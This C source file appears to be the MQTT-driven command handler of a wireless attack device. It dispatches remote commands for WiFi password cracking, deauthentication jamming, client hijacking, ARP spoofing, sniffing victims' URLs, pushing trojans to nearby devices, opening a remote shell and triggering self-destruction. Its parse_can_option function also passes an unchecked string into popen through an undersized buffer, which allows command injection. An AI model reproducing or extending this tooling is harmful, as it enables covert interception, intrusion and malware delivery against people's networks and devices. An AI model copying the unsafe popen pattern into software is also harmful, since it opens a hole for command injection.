/*************************************************************************
 *  File:       host_ctl.c
 * 
 *  Author:     Andy.Zhang
 * 
 *  Date:       2019-7-3
 *  
 *  Version:    v1.0
 * 
 *  Describe:
 ************************************************************************
 *   All rights reserved by the Sinux Co.,Ltd
 ************************************************************************/
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <time.h>
#include <MQTTAsync.h>
#include "cJSON.h"
#include "MqttProcess.h"
#include "status.h"
#include "wifi_sniffer.h"
#include "wifi_access.h"
#include "wifi_trojan.h"
#include "mac80211_atk.h"
#include "wifi_decrypt.h"
#include "mmget.h"
#include  "script.h"
// #include "UserCommHeader.h"

/***********************************************************************
 *                              Declare
 ***********************************************************************/
extern void print_json(cJSON * root);
extern int wifi_scan_policy_parse(cJSON* root);

extern uint32_t DeviceSN;
extern bool StatusQueryEvtOn;
/***********************************************************************
 *                              Variable
 ***********************************************************************/

/***********************************************************************
 *                              Function
 ***********************************************************************/
void parse_can_option(cJSON * band)
{
    cJSON * channels;

    channels = cJSON_GetObjectItem(band, "channel");
    if (channels == NULL || channels->type != cJSON_Array) {
        perror("not gived a channel table\n");
    }
    else {
        char cmd[50] = {"sh /root/.hostctl/shell/wifi-cfg.sh "}; 
        strcat(cmd, cJSON_GetArrayItem(channels, 0)->valuestring);
        puts(cmd);
        popen(cmd, "r");
    }
}

void save_scan_config(cJSON * params)
{
    FILE * fd;
    char * str;

    fd = fopen("/root/etc/config/wspy_scan.json", "w+");
    if (fd == NULL) 
        return;
    str = cJSON_Print(params);
    if (str != NULL)
        fputs(str, fd);
}
/*****************************************************************
* 函数描述：控制下发主题协议解析函数，解析上位机的下发的控制协议并执行动作
* 参数：cJSON * root json 缓存指针
* 返回值： int	0 解析成功
* 				其他 解析失败
****************************************************************/
int topic_controldown_handle(cJSON * root)
{
	cJSON * type, * obj, * resp;
	char *pdata =NULL;
    print_json(root);
    type = cJSON_GetObjectItem(root, "type");
    if (type == NULL) {
        fprintf(stderr, "msg not assigned command type\n");
        return -1;
    }
    resp = cJSON_CreateObject();
    cJSON_AddNumberToObject(resp, "sn", DeviceSN);
    if ((obj = cJSON_GetObjectItem(root, "sid")) != NULL) 
        cJSON_AddNumberToObject(resp, "sid", obj->valueint);
    else {
        cJSON_AddStringToObject(resp, "error", "no sid");
        goto msg_resp;
    }
    if (!strcmp(type->valuestring, "apDecrypt")) {//破密包抓取
    	update_status("wifiScan", "result-manual", NULL);

        update_status("apDecrypt", "status-decrypto", NULL);
        cJSON * params = cJSON_GetObjectItem(root, "apInfo");
        if (params != NULL) {
        	cJSON *dec_id = cJSON_GetObjectItem(root,"id");
        	if(dec_id != NULL){
        		memset(&WifiDecrypt,0,sizeof(WifiDecrypt));
        		strcpy(WifiDecrypt.decr_id,dec_id->valuestring);//将id拷贝到结构体中
        	//	printf("dev id %s\n",WifiDecrypt.decr_id);
        		wifi_decrypt_policy_parse(params);
        					//start_sniffer();
				cJSON_AddStringToObject(resp, "error", "none");
        	}
        	else
        	{
        		cJSON_AddStringToObject(resp, "error", "no apInfo params");
        	}
	   }
	   else
			   cJSON_AddStringToObject(resp, "error", "no apInfo params");
    }
    else if (!strcmp(type->valuestring, "apStopDecrypt")) {//破密包停止
        update_status("apDecrypt", "result-manual", NULL);
        wifi_decrypt_exit();
        cJSON_AddStringToObject(resp, "error", "none");
    }
    else if (!strcmp(type->valuestring, "apInter")) { //ap广播压制
        update_status("apInter", "status-jamming", NULL);
        cJSON * apparams = cJSON_GetObjectItem(root, "apInfo");
		if (apparams != NULL) {
			//stop_ap_inter();
			stop_sniffer();
						//stop_ap_inter();
			update_status("wifiScan", "result-manual", NULL);
			wifi_atkpolicy_parse(apparams,NULL);
			start_ap_inter();
			cJSON_AddStringToObject(resp, "error", "none");
		}
		else{
			cJSON_AddStringToObject(resp, "error", "no apAccess params");
		}
    }
    else if (!strcmp(type->valuestring, "apStopInter")) {//ap压制退出
        update_status("apInter", "result-manual", NULL);
        stop_ap_inter();
        cJSON_AddStringToObject(resp, "error", "none");
    }
    else if (!strcmp(type->valuestring, "apAccess")) { //接入
        update_status("apAccess", "status-access", NULL);
        cJSON * params = cJSON_GetObjectItem(root, "apInfo");
		if (params != NULL) {
			update_status("wifiScan", "result-manual", NULL);

			//stop_ap_inter();
			stop_sniffer();
			if(wifi_access_ap_policy_parse(params,"sta") == 0){
				cJSON_AddStringToObject(resp, "error", "none");
			}
			else{
				cJSON_AddStringToObject(resp, "error", "no apAccess params");
			}
		}
		else
			cJSON_AddStringToObject(resp, "error", "no apAccess params");
    }
    else if (!strcmp(type->valuestring, "apStopAccess")) {//停止接入
        update_status("apAccess", "result-manual", NULL);
        wifi_stop_acess();
        cJSON_AddStringToObject(resp, "error", "none");
    }
    else if (!strcmp(type->valuestring, "staInter")) {//sta压制
        update_status("staInter", "status-jamming", NULL);
        cJSON * apparams = cJSON_GetObjectItem(root, "apInfo");
        cJSON * staarams = cJSON_GetObjectItem(root, "staInfo");
		if (staarams != NULL && apparams != NULL) {
			//stop_ap_inter();
			stop_sniffer();
						//stop_ap_inter();
			update_status("wifiScan", "result-manual", NULL);
			wifi_atkpolicy_parse(apparams,staarams);
			start_sta_inter();
			cJSON_AddStringToObject(resp, "error", "none");
		}
		else{
			cJSON_AddStringToObject(resp, "error", "no apAccess params");
		}
        cJSON_AddStringToObject(resp, "error", "none");
    }
    else if (!strcmp(type->valuestring, "staStopInter")) {
        update_status("staInter", "result-manual", NULL);
        stop_sta_inter();
        cJSON_AddStringToObject(resp, "error", "none");
    }
//    else if (!strcmp(type->valuestring, "wifiInter")) {//多ap压制
//        update_status("wifiInter", "status-run", NULL);
//        cJSON_AddStringToObject(resp, "error", "none");
//    }
    else if (!strcmp(type->valuestring, "staStopInter")) {
        update_status("wifiInter", "result-manual", NULL);
        cJSON_AddStringToObject(resp, "error", "none");
    }
    else if (!strcmp(type->valuestring, "staArp")) {
       // update_status("staArp", "status-run", NULL);
        cJSON_AddStringToObject(resp, "error", "none");
        cJSON * params = cJSON_GetObjectItem(root, "apInfo");
	    cJSON * staarams = cJSON_GetObjectItem(root, "staInfo");
	    start_arp_op(params,staarams,1);
    }
    else if (!strcmp(type->valuestring, "staStopArp")) {
        update_status("staArp", "result-manual", NULL);
        cJSON * staarams = cJSON_GetObjectItem(root, "staInfo");
        start_arp_op(NULL,staarams,0);
        cJSON_AddStringToObject(resp, "error", "none");
    }
    else if (!strcmp(type->valuestring, "staAttach")) { //吸附
    	int pares=0;
        update_status("staAttach", "status-attach", NULL);
        cJSON * params = cJSON_GetObjectItem(root, "apInfo");
        cJSON * staarams = cJSON_GetObjectItem(root, "staInfo");
		if (params != NULL && staarams!=NULL) {
			stop_sniffer();
			//stop_ap_inter();
			update_status("wifiScan", "result-manual", NULL);
		//	cJSON_AddStringToObject(resp, "error", "none");
			if(wifi_access_ap_policy_parse(params,"ap")!=0){
				pares=1;
				cJSON_AddStringToObject(resp, "error", "no staAttach params");
			}
			if(pares == 0){
				if(wifi_atkpolicy_parse(params,staarams)==0){
					start_sta_inter();
					cJSON_AddStringToObject(resp, "error", "none");
				}
				else{
					cJSON_AddStringToObject(resp, "error", "no staAttach params");
				}
			}
		}
		else
			cJSON_AddStringToObject(resp, "error", "no staAttach params");
    }
    else if (!strcmp(type->valuestring, "staStopAttach")) {//停止吸附
        update_status("staAttach", "result-manual", NULL);
        cJSON_AddStringToObject(resp, "error", "none");
        stop_sta_inter();
        wifi_stop_acess();
    }
    else if (!strcmp(type->valuestring, "staCapture")) {
       // update_status("staCapture", "status-capture", "staAttach");
        cJSON_AddStringToObject(resp, "error", "none");
        cJSON * params = cJSON_GetObjectItem(root, "apInfo");
        cJSON * staarams = cJSON_GetObjectItem(root, "staInfo");
        cJSON * id = cJSON_GetObjectItem(root, "id");
        start_url_sniffer(params,staarams,id,1);
    }
    else if (!strcmp(type->valuestring, "staStopCapture")) {
        update_status("staCapture", "result-manual", NULL);
        cJSON_AddStringToObject(resp, "error", "none");
        cJSON * id = cJSON_GetObjectItem(root, "id");
        if(id == NULL){
        	printf("stop snif is null\n");
        }
        start_url_sniffer(NULL,NULL,id,0);
    }
    else if (!strcmp(type->valuestring, "staTrojan")) {
    //    update_status("staTrojan", "status-run", "staAttach");
        cJSON_AddStringToObject(resp, "error", "none");
        cJSON * params = cJSON_GetObjectItem(root, "apInfo");
        cJSON * staarams = cJSON_GetObjectItem(root, "staInfo");
        cJSON * para = cJSON_GetObjectItem(root, "params");
        start_stojan(params,staarams,para,1);
    }
    else if (!strcmp(type->valuestring, "staStopTrojan")) {
        update_status("staTrojan", "result-manual", NULL);
        cJSON_AddStringToObject(resp, "error", "none");
		cJSON * staarams = cJSON_GetObjectItem(root, "staInfo");
		start_stojan(NULL,staarams,NULL,0);
    }
    else if (!strcmp(type->valuestring, "wifiScan")) {//wifi 扫描
        update_status("wifiScan", "status-scanning", NULL);
        cJSON * params = cJSON_GetObjectItem(root, "params");
        if (params != NULL) {
            wifi_scan_policy_parse(root);
            start_sniffer();
            cJSON_AddStringToObject(resp, "error", "none");

        }
        else
            cJSON_AddStringToObject(resp, "error", "no scan params");
    }
    else if (!strcmp(type->valuestring, "wifiStopScan")) {
        stop_sniffer();
#ifdef WSPY_CAR

#endif
        update_status("wifiScan", "result-manual", NULL);
        cJSON_AddStringToObject(resp, "error", "none");
    }
    else if (!strcmp(type->valuestring, "wifiMMFiles")) {//木马下发
    	cJSON_AddStringToObject(resp, "error", "none");
    	mmget_thread_start(root,2);
    	//mmfile_query();
    }
    else if (!strcmp(type->valuestring, "MMQuery")) {//木马查询
		cJSON_AddStringToObject(resp, "error", "none");
		mmfile_query(root);
	}
    else if (!strcmp(type->valuestring, "MMDelete")) {//木马删除
		cJSON_AddStringToObject(resp, "error", "none");
		mmget_thread_start(root,1);
	}
    else if (!strcmp(type->valuestring, "wifiUpdate")) {
    	cJSON_Delete(resp);
    	return 0;
    }
    else if (!strcmp(type->valuestring, "sshOpen")) {
    	ssh_open();
    	cJSON_AddStringToObject(resp, "error", "none");
    }
    else if (!strcmp(type->valuestring, "sshClose")) {
        ssh_close();
        cJSON_AddStringToObject(resp, "error", "none");
    }
    else if (!strcmp(type->valuestring, "selfDestroy")) { //自毁指令 20201231
    	set_destroy_flag();
    	printf("do selfDestroy\n");
		cJSON_AddStringToObject(resp, "error", "none");
	}
    else if (!strcmp(type->valuestring, "ctrlShell")) { //远程shell20210128
    	wifi_access_shell(root);
		cJSON_AddStringToObject(resp, "error", "none");
	}
    else if (!strcmp(type->valuestring, "ctrlShellstop")) { //停止远程远程shell20210129
    	wifi_shell_stop();
   		cJSON_AddStringToObject(resp, "error", "none");
   	}
msg_resp:
	pdata = cJSON_Print(resp);
    mqtt_publish_msg(MQTT_TOPIC_CONTROLUP,(uint8_t *)pdata,strlen(pdata) );
    cJSON_Delete(resp);
    StatusQueryEvtOn = true;//状态下发标志置位
    return 0;
}


















